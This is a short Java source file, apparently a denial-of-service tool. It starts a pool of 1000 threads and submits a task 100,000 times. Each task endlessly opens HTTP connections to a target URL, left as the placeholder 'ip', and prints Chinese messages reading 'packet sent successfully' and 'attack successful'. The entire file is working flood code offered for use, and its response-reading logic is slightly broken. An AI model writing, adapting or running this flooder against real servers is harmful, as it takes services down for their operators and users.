package com.yqh.bbct;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Created by wyh in 2018/10/17 16:34
 **/
public class TestDos {


    public static void main(String[] args) {
        ExecutorService es = Executors.newFixedThreadPool(1000);
        DosThread dosThread = new DosThread();
        Thread thread = new Thread(dosThread);
        for (int i = 0; i < 100000; i++) {
            es.execute(thread);
        }
    }


    static class DosThread implements Runnable {

        @Override
        public void run() {
            while (true) {


                URL url = null;
                try {
                    url = new URL("ip");

                    URLConnection conn = url.openConnection();
                    System.out.println("发包成功！");
                    BufferedInputStream bis = new BufferedInputStream(
                            conn.getInputStream());
                    byte[] bytes = new byte[10240];
                    int len = -1;
                    StringBuffer sb = new StringBuffer();

                    if (bis != null) {
                        if ((len = bis.read()) != -1) {
                            sb.append(new String(bytes, 0, len));
                            System.out.println("攻击成功！");
                            bis.close();
                        }
                    }
                } catch (MalformedURLException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        }
    }
}
